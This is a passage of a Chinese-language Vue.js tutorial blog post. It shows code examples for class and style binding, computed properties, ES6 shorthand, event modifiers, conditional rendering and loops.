class="attr">:src</span>=<span class="string">&quot;img&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line">        data: &#123;</span><br><span class="line"><span class="javascript">            message: <span class="string">&quot;123&quot;</span>,</span></span><br><span class="line"><span class="javascript">            img: <span class="string">&#x27;https://img-blog.csdnimg.cn/20200221154143875.png&#x27;</span></span></span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>动态绑定class</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;active&quot;</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">:class</span>=<span class="string">&quot;active&quot;</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">:class</span>=<span class="string">&quot;&#123;active: isActive, line: false&#125;&quot;</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>   // 对象的形式，决定是否加入class属性</span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span> <span class="attr">:class</span>=<span class="string">&quot;[&#x27;active&#x27;,&#x27;line&#x27;]&quot;</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>   // 数组形式</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line">        data: &#123;</span><br><span class="line"><span class="javascript">            message: <span class="string">&quot;123&quot;</span>,</span></span><br><span class="line"><span class="javascript">            active: <span class="string">&#x27;active&#x27;</span>,</span></span><br><span class="line"><span class="javascript">            isActive: <span class="literal">true</span></span></span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>动态绑定style</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">:style</span>=<span class="string">&quot;&#123;fontSize: size&#125;&quot;</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span> <span class="attr">:style</span>=<span class="string">&quot;&#123;fontSize: &#x27;50px&#x27;&#125;&quot;</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line">        data: &#123;</span><br><span class="line"><span class="javascript">           message: <span class="string">&#x27;testme&#x27;</span>,</span></span><br><span class="line"><span class="javascript">            size: <span class="string">&#x27;50px&#x27;</span></span></span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="1-3-计算属性"><a href="#1-3-计算属性" class="headerlink" title="1.3 计算属性"></a>1.3 计算属性</h2><p>将数据经过某些计算，生成新的属性</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    &#123;&#123;fullName&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line">        data: &#123;</span><br><span class="line"><span class="javascript">            firstName: <span class="string">&#x27;testme&#x27;</span>,</span></span><br><span class="line"><span class="javascript">            lastName: <span class="string">&#x27;123&#x27;</span></span></span><br><span class="line">        &#125;,</span><br><span class="line">        computed: &#123;</span><br><span class="line"><span class="javascript">            fullName: <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> <span class="built_in">this</span>.firstName + <span class="string">&#x27; &#x27;</span> + <span class="built_in">this</span>.lastName</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>总价格: &#123;&#123;allPrice&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line">        data: &#123;</span><br><span class="line">            books: [</span><br><span class="line"><span class="javascript">                &#123;<span class="attr">id</span>: <span class="number">100</span>, <span class="attr">name</span>: <span class="string">&#x27;book1&#x27;</span>, <span class="attr">price</span>: <span class="number">100</span>&#125;,</span></span><br><span class="line"><span class="javascript">                &#123;<span class="attr">id</span>: <span class="number">102</span>, <span class="attr">name</span>: <span class="string">&#x27;book2&#x27;</span>, <span class="attr">price</span>: <span class="number">101</span>&#125;,</span></span><br><span class="line"><span class="javascript">                &#123;<span class="attr">id</span>: <span class="number">103</span>, <span class="attr">name</span>: <span class="string">&#x27;book3&#x27;</span>, <span class="attr">price</span>: <span class="number">102</span>&#125;,</span></span><br><span class="line"><span class="javascript">                &#123;<span class="attr">id</span>: <span class="number">104</span>, <span class="attr">name</span>: <span class="string">&#x27;book4&#x27;</span>, <span class="attr">price</span>: <span class="number">103</span>&#125;</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        computed: &#123;</span><br><span class="line"><span class="javascript">            allPrice: <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">let</span> total = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.books.length; i++)&#123; <span class="comment">// es6: for (let item of this.books)直接取得对象</span></span></span><br><span class="line"><span class="javascript">                    total = total+ <span class="built_in">this</span>.books[i].price</span></span><br><span class="line">                &#125;</span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> total</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>getter和setter</strong></p><p>一般不会使用set方法，get可以直接省略掉</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">&#123;&#123;fullName&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line">        data: &#123;</span><br><span class="line"><span class="javascript">            firstName: <span class="string">&#x27;test&#x27;</span>,</span></span><br><span class="line"><span class="javascript">            lastName: <span class="string">&#x27;testme&#x27;</span></span></span><br><span class="line">        &#125;,</span><br><span class="line">        computed: &#123;</span><br><span class="line">            fullName: &#123;</span><br><span class="line"><span class="javascript">                set: <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">this</span>.firstName = <span class="string">&#x27;qerty&#x27;</span>  <span class="comment">// 一般不会使用set方法，作为只读属性使用</span></span></span><br><span class="line">                &#125;,</span><br><span class="line"><span class="javascript">                get: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">return</span> <span class="built_in">this</span>.firstName + <span class="string">&#x27; &#x27;</span> + <span class="built_in">this</span>.lastName</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>计算属性计算出来的结果作为属性使用有缓存，使用多次只计算一次，而methods里面的方法，调用一次则执行一次</strong></p><h1 id="2-ES6部分语法"><a href="#2-ES6部分语法" class="headerlink" title="2. ES6部分语法"></a>2. ES6部分语法</h1><p><strong>ES6属性增强写法</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> name = <span class="string">&#x27;test&#x27;</span></span><br><span class="line"><span class="keyword">const</span> aget = <span class="number">18</span></span><br><span class="line"><span class="keyword">const</span> height = <span class="string">&#x27;1.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  name,</span><br><span class="line">  age,</span><br><span class="line">  height</span><br><span class="line">&#125; <span class="comment">// ES6增强写法，等同于如下写法：</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  name: name,</span><br><span class="line">  age: age,</span><br><span class="line">  height: height</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ES6函数增强写法</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ES5写法</span></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  run: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6增强写法，会自动添加以函数名命名的key</span></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  <span class="function"><span class="title">run</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="3-事件监听"><a href="#3-事件监听" class="headerlink" title="3. 事件监听"></a>3. 事件监听</h1><p><strong>参数传递</strong></p><p>不需要传参时，调用函数的时候可以不添加括号</p><p>如果需要传参，但是调用时候没有加括号，则默认传入event对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class="line">&#123;&#123;counter&#125;&#125;</span><br><span class="line">    &lt;button v-on:click&#x3D;&quot;btnClick&quot;&gt;+&lt;&#x2F;button&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;vue&#x2F;dist&#x2F;vue.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    let app &#x3D; new Vue(&#123;</span><br><span class="line">        el: &#39;#app&#39;,</span><br><span class="line">        data: &#123;</span><br><span class="line">            counter: 0</span><br><span class="line">        &#125;,</span><br><span class="line">        methods:&#123;</span><br><span class="line">            btnClick(abc)&#123;</span><br><span class="line">                console.log(abc)  &#x2F;&#x2F; 调用时不加括号，会传入event对象</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>单独传入事件对象，使用$event传入全局对象：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class="line">&#123;&#123;counter&#125;&#125;</span><br><span class="line">    &lt;button v-on:click&#x3D;&quot;btnClick(123, $event)&quot;&gt;+&lt;&#x2F;button&gt;  &#x2F;&#x2F; $event全局的事件对象</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;vue&#x2F;dist&#x2F;vue.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    let app &#x3D; new Vue(&#123;</span><br><span class="line">        el: &#39;#app&#39;,</span><br><span class="line">        data: &#123;</span><br><span class="line">            counter: 0</span><br><span class="line">        &#125;,</span><br><span class="line">        methods:&#123;</span><br><span class="line">            btnClick(abc, event)&#123;</span><br><span class="line">                console.log(abc)</span><br><span class="line">                console.log(event)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p><strong>修饰符</strong></p><p><code>.stop</code>阻止冒泡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class="line">    &lt;div @click&#x3D;&quot;divClick&quot;&gt;</span><br><span class="line">        &lt;button @click.stop&#x3D;&quot;btnClick&quot;&gt;按钮&lt;&#x2F;button&gt;  &#x2F;&#x2F; .stop之后，divClick不再调用</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;vue&#x2F;dist&#x2F;vue.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    let app &#x3D; new Vue(&#123;</span><br><span class="line">        el: &#39;#app&#39;,</span><br><span class="line">        data: &#123;</span><br><span class="line">            counter: 0</span><br><span class="line">        &#125;,</span><br><span class="line">        methods:&#123;</span><br><span class="line">            btnClick()&#123;</span><br><span class="line">                console.log(&#39;点击按钮&#39;)</span><br><span class="line">            &#125;,</span><br><span class="line">            divClick()&#123;</span><br><span class="line">                console.log(&#39;div点击&#39;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p><code>.prevent</code>阻止默认事件，阻止比如form提交的自动提交。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;test.html&quot;&gt;</span><br><span class="line">        &lt;button class&#x3D;&quot;submit&quot; @click.prevent&#x3D;&quot;submitClick&quot;&gt;提交&lt;&#x2F;button&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;vue&#x2F;dist&#x2F;vue.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    let app &#x3D; new Vue(&#123;</span><br><span class="line">        el: &#39;#app&#39;,</span><br><span class="line">        data: &#123;</span><br><span class="line">            counter: 0</span><br><span class="line">        &#125;,</span><br><span class="line">        methods:&#123;</span><br><span class="line">            submitClick()&#123;</span><br><span class="line">                console.log(&#39;点击提交&#39;)</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>监听按键点击：<code>@keyup.enter</code>，<code>@key.+按键别名</code></p><h1 id="4-条件判断"><a href="#4-条件判断" class="headerlink" title="4. 条件判断"></a>4. 条件判断</h1><p><code>v-if、v-if-else、v-else</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class="line">    &lt;h2 v-if&#x3D;&quot;isShow&quot;&gt;&#123;&#123;message&#125;&#125;&lt;&#x2F;h2&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;vue&#x2F;dist&#x2F;vue.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    let app &#x3D; new Vue(&#123;</span><br><span class="line">        el: &#39;#app&#39;,</span><br><span class="line">        data: &#123;</span><br><span class="line">            isShow: false,</span><br><span class="line">            message: &#39;testme&#39;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class="line">    &lt;h2 v-if&#x3D;&quot;isShow&#x3D;&#x3D;&#39;test&#39;&quot;&gt;&#123;&#123;message&#125;&#125;&lt;&#x2F;h2&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;vue&#x2F;dist&#x2F;vue.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    let app &#x3D; new Vue(&#123;</span><br><span class="line">        el: &#39;#app&#39;,</span><br><span class="line">        data: &#123;</span><br><span class="line">            isShow: &#39;testx&#39;,</span><br><span class="line">            message: &#39;testme&#39;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p><strong>虚拟dom复用</strong><br>以下代码在切换时候，input里面的内容不会被清空，如果要让input不复用的话，需要加上key属性<code>&lt;input id=&quot;username&quot; type=&quot;text&quot; key=&quot;123&quot;&gt; </code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class="line">    &lt;span v-if&#x3D;&quot;emailLogin&quot;&gt;</span><br><span class="line">        &lt;label for&#x3D;&quot;username&quot;&gt;用户名登录&lt;&#x2F;label&gt;</span><br><span class="line">        &lt;input id&#x3D;&quot;username&quot; type&#x3D;&quot;text&quot;&gt;</span><br><span class="line">    &lt;&#x2F;span&gt;</span><br><span class="line">    &lt;span v-else&gt;</span><br><span class="line">        &lt;label for&#x3D;&quot;email&quot;&gt;邮箱登录&lt;&#x2F;label&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;email&quot; id&#x3D;&quot;email&quot;&gt;</span><br><span class="line">    &lt;&#x2F;span&gt;</span><br><span class="line">    &lt;button @click&#x3D;&quot;changeLogin&quot;&gt;切换类型&lt;&#x2F;button&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;vue&#x2F;dist&#x2F;vue.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    let app &#x3D; new Vue(&#123;</span><br><span class="line">        el: &#39;#app&#39;,</span><br><span class="line">        data: &#123;</span><br><span class="line">            emailLogin: false</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line">            changeLogin()&#123;</span><br><span class="line">                this.emailLogin &#x3D; !this.emailLogin</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p><strong>v-show</strong></p><p>决定一个元素是否渲染，也是判断，在html中表现为<code>style=display:none</code>。切换频率比较高的时候使用。</p><h1 id="5-循环"><a href="#5-循环" class="headerlink" title="5. 循环"></a>5. 循环</h1><p><code>&lt;li v-for=&quot;(value, key, index) in names&quot;&gt;</code></p><p>循环遍历值、key、索引的方法</p>]]></content>
    
    
      
      
